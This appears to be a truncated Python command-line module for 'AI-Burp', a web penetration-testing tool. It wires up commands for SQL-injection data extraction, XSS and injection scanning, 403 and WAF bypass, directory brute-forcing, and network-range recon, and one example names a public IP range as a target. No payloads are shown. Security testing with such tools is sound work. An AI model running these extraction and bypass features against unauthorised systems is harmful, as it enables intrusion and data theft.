"""
AI-Burp CLI v0.13.0 (POC 五层体系)

v0.13.0 新增:
1. poc-scan 命令 - POC 漏洞扫描
   - 五层 POC 体系 (内置/Nuclei自动/Nuclei手工/GitHub/自定义)
   - 23+ 内置高频 POC (信息泄露/配置错误/CMS)
   - 按标签/CVE 过滤扫描
   - Nuclei 模板自动转换器
   - GitHub POC 搜索器

v0.12.0 新增:
1. mssql-extract 命令 - MSSQL 报错注入数据提取
   - 支持日文/Unicode 表名 (CHAR() 绕过)
   - MSSQL 2000 兼容 (TOP N 替代 ROW_NUMBER)
   - 网络重试机制
   - 敏感数据自动脱敏
2. recon 命令 - 资产侦察
   - 并行扫描 (可配置线程数)
   - ASP/PHP/JSP 站点识别
   - 参数自动发现
   - 批量 SQLi 检测
   - 拓扑报告生成

v0.11.0 新增:
1. xss-scan 命令 - XSS 漏洞检测 (反射/DOM/属性注入)
2. leak-scan 命令 - 源码泄露检测 (.git/.svn/备份/配置)
3. --output 参数 - 报告导出 (json/md/html)
4. --targets 参数 - 批量目标扫描
5. 扩充 payload 字典 (200万+)

v0.10.0 新增:
1. dirfuzz 命令 - 目录爆破/敏感文件发现
2. 内置字典 (quick/common/asp/sensitive)
3. 401/403 绕过尝试
4. 多线程扫描
5. 敏感文件自动标记

v0.9.0 新增:
1. extract 命令 - UNION 注入自动数据提取
2. 自动检测列数和回显列
3. 表名/列名枚举
4. 敏感数据脱敏
5. 风险等级评估

v0.8.0 新增:
1. deep-analyze 命令 - 深度注入分析，评估可利用性
2. 响应指纹分析 - 识别统一异常处理
3. 多维度差异检测 - 状态码/大小/时间/内容
4. 数据库类型自动推断
5. 利用可行性评估

用法:
    # XSS 检测 (v0.11.0 新增)
    aiburp xss-scan http://target.com/search.asp q test
    aiburp xss-scan http://target.com/search.asp q test --deep
    
    # 源码泄露检测 (v0.11.0 新增)
    aiburp leak-scan http://target.com
    aiburp leak-scan http://target.com --types backup vcs db
    
    # 批量扫描 (v0.11.0 新增)
    aiburp auto-scan --targets urls.txt --output report.html
    
    # 目录发现
    aiburp dirfuzz http://target.com --wordlist quick
    aiburp dirfuzz http://target.com --wordlist asp --threads 10
    
    # 数据提取
    aiburp extract http://target.com/product.asp pid 118 --db access
    
    # 深度分析
    aiburp deep-analyze https://target.com/login username test --post
    
    # 自动扫描
    aiburp auto-scan https://target.com --depth full --output report.json
    
    # 手动测试
    aiburp probe https://target.com/api id 1
    aiburp scan https://target.com/api id 1 --types sqli xss
"""

import argparse
import time
import json
import urllib.parse
from .sync_wrapper import SyncBurp as Burp, SyncSmartBurp as SmartBurp
from .payloads import SQLI, XSS, LFI, SSRF, CMDi, SSTI
from .detectors import VulnScanner
from .plugins.deep_analysis import DeepAnalyzer, deep_analyze_command
from .plugins.extractor import DataExtractor, extract_command
from .plugins.discovery import DirFuzzer, dirfuzz_command
from .plugins.reporter import Reporter

# 废弃的扫描器 (已移至 archive，保留空实现以兼容)
class LeakScanner:
    """[已废弃] 请使用 dirfuzz 命令"""
    pass

class XSSScanner:
    """[已废弃] 请使用 auto-scan --types xss"""
    pass

class AutoDiscovery:
    """[已废弃] 请使用 param-discover 命令"""
    def __init__(self, burp):
        self.burp = burp
    def discover(self, url, depth=1):
        print("⚠️ discover 已废弃，请使用: aiburp param-discover <url>")
        return []

class AutoScanner:
    """[已废弃] 请使用 auto-scan 命令"""
    def __init__(self, burp):
        self.burp = burp
    def scan(self, *args, **kwargs):
        print("⚠️ 旧版 AutoScanner 已废弃，请使用新的 auto-scan 命令")
        return {}

def leak_scan_command(*args, **kwargs):
    return "⚠️ leak-scan 已废弃，请使用: aiburp dirfuzz <url> --wordlist sensitive"

def xss_scan_command(*args, **kwargs):
    return "⚠️ xss-scan 已废弃，请使用: aiburp auto-scan <url> --types xss"


def fuzz_report(results):
    """生成 Fuzz 报告"""
    lines = [f"测试 {len(results)} 个 payload:\n"]
    
    interesting = [r for r in results if r.is_interesting]
    blocked = [r for r in results if r.blocked]
    
    if interesting:
        lines.append("🔍 有趣的响应:")
        for r in interesting:
            lines.append(f"  {r.payload}: {r}")
    
    if blocked:
        lines.append(f"\n🚫 被拦截: {len(blocked)} 个")
    
    if not interesting and not blocked:
        lines.append("未发现异常")
    
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description="AI-Burp CLI")
    parser.add_argument("--delay", type=float, default=1.0, help="请求间隔(秒)")
    parser.add_argument("--project", default="default", help="项目名")
    
    subparsers = parser.add_subparsers(dest="command", help="命令")
    
    # help (帮助文档)
    help_parser = subparsers.add_parser("help", help="查看帮助文档")
    help_parser.add_argument("topic", nargs="?", default="overview",
                            help="帮助主题 (overview/commands/plugins/payloads/examples/ide/api)")
    
    # auto-scan (新增 - 推荐)
    auto_parser = subparsers.add_parser("auto-scan", help="自动扫描 (推荐)")
    auto_parser.add_argument("url", nargs="?", help="目标 URL")
    auto_parser.add_argument("--targets", help="目标文件 (每行一个 URL)")
    auto_parser.add_argument("--depth", "-d", default="normal",
                            choices=["quick", "normal", "full"],
                            help="扫描深度 (quick=快速, normal=标准, full=完整)")
    auto_parser.add_argument("--types", "-t", nargs="+",
                            choices=["sqli", "xss", "lfi", "ssti", "ssrf", "cmdi"],
                            help="测试类型 (默认: sqli, xss)")
    auto_parser.add_argument("--no-headers", action="store_true", help="不测试 HTTP 头")
    auto_parser.add_argument("--no-cookies", action="store_true", help="不测试 Cookie")
    auto_parser.add_argument("--output", "-o", help="报告输出文件 (.json/.md/.html)")
    
    # xss-scan (v0.11.0 新增) - XSS 检测
    xss_parser = subparsers.add_parser("xss-scan", help="XSS 漏洞检测")
    xss_parser.add_argument("url", help="目标 URL")
    xss_parser.add_argument("param", help="参数名")
    xss_parser.add_argument("value", help="参数值")
    xss_parser.add_argument("--post", "-p", action="store_true", help="使用 POST 方法")
    xss_parser.add_argument("--deep", action="store_true", help="深度扫描 (更多 payload)")
    xss_parser.add_argument("--output", "-o", help="报告输出文件")
    
    # leak-scan (v0.11.0 新增) - 源码泄露检测
    leak_parser = subparsers.add_parser("leak-scan", help="源码泄露检测")
    leak_parser.add_argument("url", help="目标 URL")
    leak_parser.add_argument("--types", "-t", nargs="+",
                            choices=["backup", "vcs", "db", "config", "archive", "sensitive"],
                            help="扫描类型 (默认全部)")
    leak_parser.add_argument("--threads", type=int, default=10, help="线程数 (默认 10)")
    leak_parser.add_argument("--output", "-o", help="报告输出文件")
    
    # deep-analyze (v0.8.0 新增) - 深度注入分析
    deep_parser = subparsers.add_parser("deep-analyze", help="深度注入分析 (评估可利用性)")
    deep_parser.add_argument("url", help="目标 URL")
    deep_parser.add_argument("param", help="参数名")
    deep_parser.add_argument("value", help="参数值")
    deep_parser.add_argument("--post", "-p", action="store_true", help="使用 POST 方法")
    deep_parser.add_argument("--data", "-d", help="POST 数据 (如 'id=1&name=test')")
    
    # mssql-extract (v0.12.0 新增) - MSSQL 数据提取
    mssql_parser = subparsers.add_parser("mssql-extract", help="MSSQL 报错注入数据提取 (支持日文表名)")
    mssql_parser.add_argument("url", help="目标 URL")
    mssql_parser.add_argument("param", help="参数名")
    mssql_parser.add_argument("value", nargs="?", default="24", help="参数值 (默认 24)")
    mssql_parser.add_argument("--output", "-o", help="输出文件 (.json)")
    
    # recon (v0.12.0 新增) - 资产侦察
    recon_parser = subparsers.add_parser("recon", help="资产侦察 (批量扫描)")
    recon_parser.add_argument("target", help="目标 CIDR (如 66.242.136.0/24)")
    recon_parser.add_argument("--test", "-t", action="store_true", help="测试发现的资产")
    recon_parser.add_argument("--threads", type=int, default=50, help="线程数 (默认 50)")
    recon_parser.add_argument("--output", "-o", help="输出文件 (.json/.md)")
    
    # extract (v0.9.0 新增) - 数据提取
    extract_parser = subparsers.add_parser("extract", help="UNION 注入数据提取")
    extract_parser.add_argument("url", help="目标 URL")
    extract_parser.add_argument("param", help="参数名")
    extract_parser.add_argument("value", help="参数值")
    extract_parser.add_argument("--db", "-d", default="auto", 
                               choices=["auto", "access", "mysql", "mssql", "postgresql"],
                               help="数据库类型 (默认自动检测)")
    extract_parser.add_argument("--tables", "-t", help="指定表名 (逗号分隔)")
    extract_parser.add_argument("--columns", "-c", type=int, help="已知列数 (跳过检测)")
    extract_parser.add_argument("--echo", "-e", type=int, help="已知回显列 (跳过检测)")
    
    # dirfuzz (v0.10.0 新增) - 目录发现
    dirfuzz_parser = subparsers.add_parser("dirfuzz", help="目录爆破/敏感文件发现")
    dirfuzz_parser.add_argument("url", nargs="?", help="目标 URL")
    dirfuzz_parser.add_argument("--wordlist", "-w", default="quick",
                               help="字典 (quick/common/medium/large/seclists/raft-dirs/raft-files/quickhits/backup/fuzz/asp/sensitive 或文件路径)")
    dirfuzz_parser.add_argument("--list-wordlists", action="store_true",
                               help="列出所有可用字典")
    dirfuzz_parser.add_argument("--extensions", "-e", help="扩展名 (逗号分隔，如 .php,.asp)")
    dirfuzz_parser.add_argument("--bypass", "-b", action="store_true", help="尝试绕过 401/403")
    dirfuzz_parser.add_argument("--combo", "-c", action="store_true", 
                               help="组合模式 - 目录+文件组合 (用于 401 站点)")
    dirfuzz_parser.add_argument("--threads", "-t", type=int, default=5, help="线程数 (默认 5)")
    
    # bypass403 (v0.12.0 新增) - 403 绕过 (BypassPro 风格)
    bypass403_parser = subparsers.add_parser("bypass403", help="403/401 绕过测试 (BypassPro 风格)")
    bypass403_parser.add_argument("url", help="返回 403/401 的 URL")
    bypass403_parser.add_argument("--aggressive", "-a", action="store_true", 
                                  help="激进模式 (更多变体，可能触发 WAF)")
    
    # fingerprint (v0.13.0 新增) - 技术栈指纹识别
    fp_parser = subparsers.add_parser("fingerprint", help="技术栈指纹识别 (Wappalyzer)")
    fp_parser.add_argument("url", nargs="?", help="目标 URL")
    fp_parser.add_argument("--targets", help="目标文件 (每行一个 URL)")
    fp_parser.add_argument("--output", "-o", help="报告输出文件 (.json/.md)")
    fp_parser.add_argument("--threads", type=int, default=5, help="线程数 (默认 5)")
    
    # poc-scan (v0.13.0 新增) - POC 漏洞扫描
    poc_parser = subparsers.add_parser("poc-scan", help="POC 漏洞扫描 (五层 POC 体系)")
    poc_parser.add_argument("url", nargs="?", help="目标 URL")
    poc_parser.add_argument("--targets", help="目标文件 (每行一个 URL)")
    poc_parser.add_argument("--tags", "-t", nargs="+", 
                           help="POC 标签过滤 (如 wordpress, info-leak, cms)")
    poc_parser.add_argument("--cve", help="指定 CVE 编号 (如 CVE-2024-1234)")
    poc_parser.add_argument("--list", "-l", action="store_true", help="列出所有可用 POC")
    poc_parser.add_argument("--search", "-s", help="搜索 POC")
    poc_parser.add_argument("--output", "-o", help="报告输出文件 (.json/.md)")
    poc_parser.add_argument("--threads", type=int, default=5, help="线程数 (默认 5)")
    
    # param-discover (v0.13.0 新增) - 参数发现 (JS/表单/隐藏参数)
    pd_parser = subparsers.add_parser("param-discover", help="参数发现 (JS资产/表单/隐藏参数)")
    pd_parser.add_argument("url", help="目标 URL")
    pd_parser.add_argument("--depth", "-d", type=int, default=1, help="爬取深度 (默认 1)")
    pd_parser.add_argument("--no-js", action="store_true", help="不分析 JS 文件")
    pd_parser.add_argument("--probe", "-p", action="store_true", help="探测隐藏参数")
    pd_parser.add_argument("--output", "-o", help="报告输出文件 (.json/.md)")
    
    # subdomain (v0.13.0 新增) - 子域名收集
    sub_parser = subparsers.add_parser("subdomain", help="子域名收集 (多源聚合)")
    sub_parser.add_argument("domain", help="目标域名 (不带 http://)")
    sub_parser.add_argument("--sources", "-s", nargs="+", 
                           choices=["crtsh", "hackertarget", "alienvault", "urlscan", "rapiddns"],
                           help="数据源 (默认全部)")
    sub_parser.add_argument("--verify", "-v", action="store_true", help="验证存活")
    sub_parser.add_argument("--output", "-o", help="报告输出文件 (.json/.txt)")
    sub_parser.add_argument("--threads", type=int, default=5, help="线程数 (默认 5)")
    
    # dork (v0.13.0 新增) - 搜索引擎 Dork
    dork_parser = subparsers.add_parser("dork", help="搜索引擎 Dork (Shodan/Fofa/Google)")
    dork_parser.add_argument("query", help="搜索查询或目标域名")
    dork_parser.add_argument("--engine", "-e", default="shodan",
                            choices=["shodan", "fofa", "google"],
                            help="搜索引擎 (默认 shodan)")
    dork_parser.add_argument("--category", "-c",
                            choices=["admin_login", "sensitive_files", "exposed_docs", "api_endpoints", "error_pages"],
                            help="Google Dork 分类")
    dork_parser.add_argument("--limit", "-l", type=int, default=100, help="结果数量限制")
    dork_parser.add_argument("--output", "-o", help="报告输出文件 (.json)")
    
    # ffuzz (v0.13.0 新增) - 高性能异步 Fuzzer (ffuf 风格)
    ffuzz_parser = subparsers.add_parser("ffuzz", help="高性能 Fuzzer (ffuf 风格, 500+ req/s)")
    ffuzz_parser.add_argument("url", help="URL 模板 (用 FUZZ 标记注入点)")
    ffuzz_parser.add_argument("--wordlist", "-w", default="quick", help="字典 (quick/common/asp/sensitive 或文件路径)")
    ffuzz_parser.add_argument("--method", "-X", default="GET", help="HTTP 方法")
    ffuzz_parser.add_argument("--header", "-H", action="append", help="自定义头 (可多次使用)")
    ffuzz_parser.add_argument("--data", "-d", help="POST 数据 (可包含 FUZZ)")
    ffuzz_parser.add_argument("--concurrency", "-c", type=int, default=100, help="并发数 (默认 100)")
    ffuzz_parser.add_argument("--rate", "-r", type=int, default=0, help="速率限制 req/s (默认不限)")
    ffuzz_parser.add_argument("--timeout", "-t", type=int, default=10, help="超时秒数 (默认 10)")
    ffuzz_parser.add_argument("--match-status", "-mc", help="匹配状态码 (逗号分隔, 如 200,301,403)")
    ffuzz_parser.add_argument("--filter-status", "-fc", help="过滤状态码 (逗号分隔)")
    ffuzz_parser.add_argument("--filter-size", "-fs", type=int, help="过滤响应大小")
    ffuzz_parser.add_argument("--filter-words", "-fw", type=int, help="过滤单词数")
    ffuzz_parser.add_argument("--filter-lines", "-fl", type=int, help="过滤行数")
    ffuzz_parser.add_argument("--no-calibrate", action="store_true", help="禁用自动校准")
    ffuzz_parser.add_argument("--follow", "-f", action="store_true", help="跟随重定向")
    ffuzz_parser.add_argument("--output", "-o", help="输出文件 (.json/.txt)")

    # discover (新增)
    discover_parser = subparsers.add_parser("discover", help="自动发现参数和表单")
    discover_parser.add_argument("url", help="目标 URL")
    discover_parser.add_argument("--depth", "-d", type=int, default=1, help="爬取深度")
    
    # api-json (新增) - JSON API 测试
    api_json_parser = subparsers.add_parser("api-json", help="JSON API 参数测试")
    api_json_parser.add_argument("url", help="API URL")
    api_json_parser.add_argument("--body", "-b", required=True, help="JSON Body (如 '{\"id\": \"1\"}')")
    api_json_parser.add_argument("--param", "-p", required=True, help="要测试的参数名")
    api_json_parser.add_argument("--method", "-m", default="POST", choices=["POST", "PUT", "PATCH"], help="HTTP 方法")
    api_json_parser.add_argument("--headers", "-H", help="自定义头 (如 'Authorization: Bearer xxx')")
    api_json_parser.add_argument("--types", "-t", nargs="+", default=["sqli"], 
                                choices=["sqli", "xss", "ssti", "nosqli"],
                                help="测试类型")
    
    # api-rest (新增) - REST API 路径参数测试
    api_rest_parser = subparsers.add_parser("api-rest", help="REST API 路径参数测试")
    api_rest_parser.add_argument("url", help="API URL (用 § 标记注入点，如 /users/§1§/profile)")
    api_rest_parser.add_argument("--method", "-m", default="GET", choices=["GET", "POST", "PUT", "DELETE"], help="HTTP 方法")
    api_rest_parser.add_argument("--headers", "-H", help="自定义头")
    api_rest_parser.add_argument("--types", "-t", nargs="+", default=["sqli", "idor"],
                                choices=["sqli", "xss", "idor", "lfi"],
                                help="测试类型")
    
    # api-graphql (新增) - GraphQL 测试
    api_graphql_parser = subparsers.add_parser("api-graphql", help="GraphQL API 测试")
    api_graphql_parser.add_argument("url", help="GraphQL endpoint URL")
    api_graphql_parser.add_argument("--query", "-q", required=True, help="GraphQL 查询 (用 § 标记注入点)")
    api_graphql_parser.add_argument("--variables", "-v", help="GraphQL 变量 (JSON)")
    api_graphql_parser.add_argument("--headers", "-H", help="自定义头")
    
    # probe
    probe_parser = subparsers.add_parser("probe", help="探测参数")
    probe_parser.add_argument("url", help="目标 URL")
    probe_parser.add_argument("param", help="参数名")
    probe_parser.add_argument("value", help="参数值")
    probe_parser.add_argument("--smart", "-s", action="store_true", help="智能模式")
    probe_parser.add_argument("--post", "-p", action="store_true", help="使用 POST 方法")
    probe_parser.add_argument("--data", "-d", help="POST 数据 (如 'id=1&name=test')")
    probe_parser.add_argument("--shallow", action="store_true", help="浅层探测 (不测时间盲注)")
    
    # scan
    scan_parser = subparsers.add_parser("scan", help="漏洞扫描")
    scan_parser.add_argument("url", help="目标 URL")
    scan_parser.add_argument("param", help="参数名")
    scan_parser.add_argument("value", help="参数值")
    scan_parser.add_argument("--types", "-t", nargs="+", 
                            choices=["sqli", "xss", "ssrf", "cmdi", "lfi", "ssti"],
                            help="漏洞类型 (默认全部)")
    scan_parser.add_argument("--oob", help="OOB 外带域名")
    scan_parser.add_argument("--post", "-p", action="store_true", help="使用 POST 方法")
    
    # fuzz
    fuzz_parser = subparsers.add_parser("fuzz", help="批量测试")
    fuzz_parser.add_argument("url", help="URL (用 § 标记注入点)")
    fuzz_parser.add_argument("--payloads", "-p", default="sqli", 
                            choices=["sqli", "xss", "lfi", "ssrf", "cmdi", "ssti",
                                    "sqli_time", "sqli_error", "sqli_auth", "sqli_bypass"],
                            help="Payload 类型")
    fuzz_parser.add_argument("--quick", "-q", action="store_true", help="快速模式")
    
    # post-form - 新增 POST 表单测试
    post_parser = subparsers.add_parser("post-form", help="POST 表单注入测试")
    post_parser.add_argument("url", help="目标 URL")
    post_parser.add_argument("params", nargs="+", help="要测试的参数名")
    post_parser.add_argument("--data", "-d", required=True, help="POST 数据 (如 'user=admin&pass=test')")
    post_parser.add_argument("--types", "-t", nargs="+", default=["sqli"],
                            choices=["sqli", "xss", "ssrf", "cmdi", "lfi", "ssti"],
                            help="测试类型")
    
    # request
    req_parser = subparsers.add_parser("request", help="发送请求")
    req_parser.add_argument("method", help="HTTP 方法")
    req_parser.add_argument("url", help="目标 URL")
    req_parser.add_argument("--data", "-d", help="POST 数据")
    req_parser.add_argument("--session", "-s", help="使用保存的会话 (v0.18.0)")
    
    # confirm-blind - 时间盲注确认
    blind_parser = subparsers.add_parser("confirm-blind", help="时间盲注确认")
    blind_parser.add_argument("url", help="目标 URL")
    blind_parser.add_argument("param", help="参数名")
    blind_parser.add_argument("value", help="参数值")
    blind_parser.add_argument("--sleep", type=int, default=3, help="SLEEP 秒数 (默认 3)")
    blind_parser.add_argument("--times", type=int, default=3, help="测试次数 (默认 3)")
    blind_parser.add_argument("--threshold", type=float, default=0.8, help="延迟阈值比例 (默认 0.8)")
    
    # header - HTTP 头注入测试
    header_parser = subparsers.add_parser("header", help="HTTP 头注入测试")
    header_parser.add_argument("url", help="目标 URL")
    header_parser.add_argument("--headers", "-H", default="X-Forwarded-For,Host,X-Real-IP,Referer,User-Agent",
                               help="要测试的头 (逗号分隔)")
    header_parser.add_argument("--cookie", "-c", help="Cookie 值 (测试 Cookie 注入)")
    header_parser.add_argument("--types", "-t", nargs="+", default=["sqli"],
                               choices=["sqli", "xss", "ssrf", "cmdi"],
                               help="测试类型")
    
    # idor - IDOR 测试
    idor_parser = subparsers.add_parser("idor", help="IDOR 枚举测试")
    idor_parser.add_argument("url", help="URL (用 § 标记枚举点)")
    idor_parser.add_argument("--range", "-r", default="1-100", help="枚举范围 (如 1-100)")
    idor_parser.add_argument("--wordlist", "-w", help="字典文件")
    idor_parser.add_argument("--baseline", "-b", help="基线响应大小 (自动检测)")
    idor_parser.add_argument("--diff", "-d", type=int, default=50, help="响应差异阈值 (字节)")
    idor_parser.add_argument("--ssrf", action="store_true", help="测试 SSRF (内网 URL)")
    
    # portscan (v0.14.0 新增) - 端口扫描与服务识别
    ps_parser = subparsers.add_parser("portscan", help="端口扫描与服务识别 (100 个内置指纹)")
    ps_parser.add_argument("target", help="目标 IP/域名/CIDR (如 192.168.1.1 或 192.168.1.0/24)")
    ps_parser.add_argument("--ports", "-p", default="top100",
                          help="端口范围 (top100/top1000/all/80,443/1-1000)")
    ps_parser.add_argument("--timeout", "-t", type=float, default=2.0, help="超时秒数 (默认 2)")
    ps_parser.add_argument("--concurrency", "-c", type=int, default=500, help="并发数 (默认 500)")
    ps_parser.add_argument("--deep", "-d", action="store_true", help="深度模式 (调用 nmap)")
    ps_parser.add_argument("--output", "-o", help="输出文件 (.json/.txt)")
    
    # auth (v0.18.0 新增) - 认证会话管理
    auth_parser = subparsers.add_parser("auth", help="认证会话管理 (v0.18.0)")
    auth_subparsers = auth_parser.add_subparsers(dest="auth_action", help="认证操作")
    
    # auth login - 自动登录
    auth_login = auth_subparsers.add_parser("login", help="自动登录并保存会话")
    auth_login.add_argument("url", help="登录页面 URL")
    auth_login.add_argument("-u", "--username", required=True, help="用户名")
    auth_login.add_argument("-p", "--password", required=True, help="密码")
    auth_login.add_argument("--save", "-s", required=True, help="保存会话名称")
    auth_login.add_argument("--user-field", help="用户名字段名 (自动检测)")
    auth_login.add_argument("--pass-field", help="密码字段名 (自动检测)")
    auth_login.add_argument("--check-url", help="验证登录成功的 URL")
    auth_login.add_argument("--success", help="登录成功的标志字符串")
    auth_login.add_argument("--failure", help="登录失败的标志字符串")
    
    # auth import-cookie - 导入 Cookie
    auth_import_cookie = auth_subparsers.add_parser("import-cookie", help="从 Cookie 字符串导入")
    auth_import_cookie.add_argument("cookie", help="Cookie 字符串 (如 'PHPSESSID=xxx; token=yyy')")
    auth_import_cookie.add_argument("--save", "-s", required=True, help="保存会话名称")
    
    # auth import-token - 导入 Token
    auth_import_token = auth_subparsers.add_parser("import-token", help="导入 Bearer/Basic Token")
    auth_import_token.add_argument("token", help="Token 值")
    auth_import_token.add_argument("--save", "-s", required=True, help="保存会话名称")
    auth_import_token.add_argument("--type", "-t", default="bearer", 
                                   choices=["bearer", "basic", "custom"],
                                   help="Token 类型 (默认 bearer)")
    
    # auth import-burp - 从 Burp 导入
    auth_import_burp = auth_subparsers.add_parser("import-burp", help="从 Burp Suite 导出文件导入")
    auth_import_burp.add_argument("file", help="Burp 导出的 Cookie 文件")
    auth_import_burp.add_argument("--save", "-s", required=True, help="保存会话名称")
    
    # auth list - 列出会话
    auth_list = auth_subparsers.add_parser("list", help="列出所有保存的会话")
    
    # auth show - 显示会话详情
    auth_show = auth_subparsers.add_parser("show", help="显示会话详情")
    auth_show.add_argument("name", help="会话名称")
    
    # auth delete - 删除会话
    auth_delete = auth_subparsers.add_parser("delete", help="删除会话")
    auth_delete.add_argument("name", help="会话名称")
    
    # auth check - 检查会话有效性
    auth_check = auth_subparsers.add_parser("check", help="检查会话有效性")
    auth_check.add_argument("name", help="会话名称")
    auth_check.add_argument("--url", help="验证 URL (默认使用保存的 check_url)")
    
    # auth export - 导出会话
    auth_export = auth_subparsers.add_parser("export", help="导出会话")
    auth_export.add_argument("name", help="会话名称")
    auth_export.add_argument("--format", "-f", default="cookie",
                            choices=["cookie", "curl", "python", "burp"],
                            help="导出格式 (默认 cookie)")
    
    # report (v0.18.0 新增) - 报告生成
    report_parser = subparsers.add_parser("report", help="生成渗透测试报告 (v0.18.0)")
    report_subparsers = report_parser.add_subparsers(dest="report_action", help="报告操作")
    
    # report generate
    report_gen = report_subparsers.add_parser("generate", help="生成报告")
    report_gen.add_argument("--format", "-f", default="html",
                           choices=["html", "md", "json"],
                           help="报告格式 (默认 html)")
    report_gen.add_argument("--output", "-o", required=True, help="输出文件路径")
    report_gen.add_argument("--title", "-t", help="报告标题")
    report_gen.add_argument("--target", help="目标 URL")
    report_gen.add_argument("--findings", help="漏洞发现 JSON 文件")
    
    # waf-detect (v0.18.0 新增) - WAF 检测
    waf_parser = subparsers.add_parser("waf-detect", help="WAF 检测 (v0.18.0)")
    waf_parser.add_argument("url", help="目标 URL")
    
    # smart-fuzz (v0.18.0 新增) - 智能 Fuzz
    smart_fuzz_parser = subparsers.add_parser("smart-fuzz", help="智能 Fuzz (WAF 绕过) (v0.18.0)")
    smart_fuzz_parser.add_argument("url", help="目标 URL")
    smart_fuzz_parser.add_argument("param", help="参数名")
    smart_fuzz_parser.add_argument("value", help="参数值")
    smart_fuzz_parser.add_argument("--type", "-t", default="sqli",
                                   choices=["sqli", "xss"],
                                   help="漏洞类型 (默认 sqli)")
    smart_fuzz_parser.add_argument("--max", "-m", type=int, default=50,
                                   help="最大 payload 数 (默认 50)")
    
    # targets (v0.18.0 新增) - 批量目标管理
    targets_parser = subparsers.add_parser("targets", help="批量目标管理 (v0.18.0)")
    targets_subparsers = targets_parser.add_subparsers(dest="targets_action", help="目标操作")
    
    # targets import
    targets_import = targets_subparsers.add_parser("import", help="导入目标列表")
    targets_import.add_argument("file", help="目标文件 (每行一个 URL)")
    
    # targets add
    targets_add = targets_subparsers.add_parser("add", help="添加单个目标")
    targets_add.add_argument("url", help="目标 URL")
    
    # targets list
    targets_list = targets_subparsers.add_parser("list", help="列出所有目标")
    targets_list.add_argument("--status", "-s",
                             choices=["new", "alive", "dead", "scanned", "vulnerable"],
                             help="按状态筛选")
    
    # targets check
    targets_check = targets_subparsers.add_parser("check", help="检查目标存活状态")
    targets_check.add_argument("--threads", "-t", type=int, default=10, help="线程数")
    
    # targets fingerprint
    targets_fp = targets_subparsers.add_parser("fingerprint", help="批量指纹识别")
    targets_fp.add_argument("--threads", "-t", type=int, default=5, help="线程数")
    
    # targets scan
    targets_scan = targets_subparsers.add_parser("scan", help="批量漏洞扫描")
    targets_scan.add_argument("--types", "-t", nargs="+",
                             choices=["sqli", "xss", "lfi", "ssrf"],
                             default=["sqli", "xss"],
                             help="漏洞类型")
    targets_scan.add_argument("--threads", type=int, default=3, help="线程数")
    
    # targets export
    targets_export = targets_subparsers.add_parser("export", help="导出结果")
    targets_export.add_argument("--output", "-o", required=True, help="输出文件")
    targets_export.add_argument("--format", "-f", default="json",
                               choices=["json", "txt", "csv"],
                               help="导出格式")
    
    # targets clear
    targets_clear = targets_subparsers.add_parser("clear", help="清空所有目标")
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # help 命令不需要 burp 实例
    if args.command == "help":
        from .help import print_help
        print_help(args.topic)
        return
    
    burp = Burp(project=args.project, delay=args.delay)
    
    try:
        if args.command == "deep-analyze":
            # 深度分析 (v0.8.0 新增)
            method = "POST" if args.post else "GET"
            result = deep_analyze_command(burp, args.url, args.param, args.value, method)
            print(result)
        
        elif args.command == "mssql-extract":
            # MSSQL 数据提取 (v0.12.0 新增)
            from .plugins.mssql_extractor import MSSQLExtractor
            extractor = MSSQLExtractor(burp)
            result = extractor.extract(args.url, args.param, args.value)
            print(result)
            
            if args.output:
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(result.to_json())
                print(f"\n📄 结果已保存: {args.output}")
        
        elif args.command == "recon":
            # 资产侦察 (v0.12.0 新增)
            from .plugins.asset_recon import AssetRecon
            recon = AssetRecon(burp, max_workers=args.threads)
            result = recon.scan_range(args.target)
            
            if args.test:
                result = recon.test_assets(result)
            
            print(result)
            
            if args.output:
                if args.output.endswith('.md'):
                    content = recon.generate_topology(result)
                else:
                    content = result.to_json()
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(f"\n📄 结果已保存: {args.output}")
        
        elif args.command == "extract":
            # 数据提取 (v0.9.0 新增)
            result = extract_command(
                burp, args.url, args.param, args.value,
                db_type=args.db,
                tables=args.tables
            )
            print(result)
        
        elif args.command == "dirfuzz":
            # 目录发现 (v0.10.0 新增)
            
            # 列出可用字典
            if hasattr(args, 'list_wordlists') and args.list_wordlists:
                from .plugins.discovery import DirFuzzer
                from pathlib import Path
                # cli.py -> aiburp -> ai-burp/payloads
                payloads_dir = Path(__file__).parent.parent / 'payloads'
                
                print("=" * 60)
                print("📚 可用字典列表")
                print("=" * 60)
                for name, path in DirFuzzer.WORDLISTS.items():
                    full_path = payloads_dir / path
                    if full_path.exists():
                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = sum(1 for line in f if line.strip() and not line.startswith('#'))
                        print(f"  {name:15} ({lines:5} 行) - {path}")
                    else:
                        print(f"  {name:15} (不存在) - {path}")
                print("=" * 60)
                return
            
            result = dirfuzz_command(
                burp, args.url,
                wordlist=args.wordlist,
                extensions=args.extensions,
                bypass=args.bypass,
                threads=args.threads,
                combo=args.combo
            )
            print(result)
        
        elif args.command == "bypass403":
            # 403 绕过 (v0.12.0 新增)
            from .plugins.discovery import bypass403_command
            result = bypass403_command(burp, args.url, aggressive=args.aggressive)
            print(result)
        
        elif args.command == "poc-scan":
            # POC 漏洞扫描 (v0.13.0 新增)
            from .pocs import POCManager
            import warnings
            warnings.filterwarnings('ignore')
            
            manager = POCManager()
            
            # 列出 POC
            if args.list:
                pocs = manager.list_pocs()
                print("=" * 60)
                print(f"📋 可用 POC: {len(pocs)} 个")
                print("=" * 60)
                for poc in pocs:
                    severity_icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "info": "⚪"}.get(poc.severity.value, "⚪")
                    print(f"  {severity_icon} {poc.id}")
                    print(f"     {poc.name}")
                    print(f"     标签: {', '.join(poc.tags[:5])}")
                    print()
                
                stats = manager.stats()
                print("=" * 60)
                print(f"统计: {stats['total']} 个 POC, {len(stats['tags'])} 个标签")
                print(f"标签: {', '.join(stats['tags'][:10])}...")
                print("=" * 60)
                return
            
            # 搜索 POC
            if args.search:
                pocs = manager.search(args.search)
                print(f"🔍 搜索 '{args.search}': {len(pocs)} 个结果")
                for poc in pocs:
                    print(f"  - {poc.id}: {poc.name}")
                return
            
            # 执行扫描
            targets = []
            if args.targets:
                with open(args.targets, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            elif args.url:
                targets = [args.url]
            else:
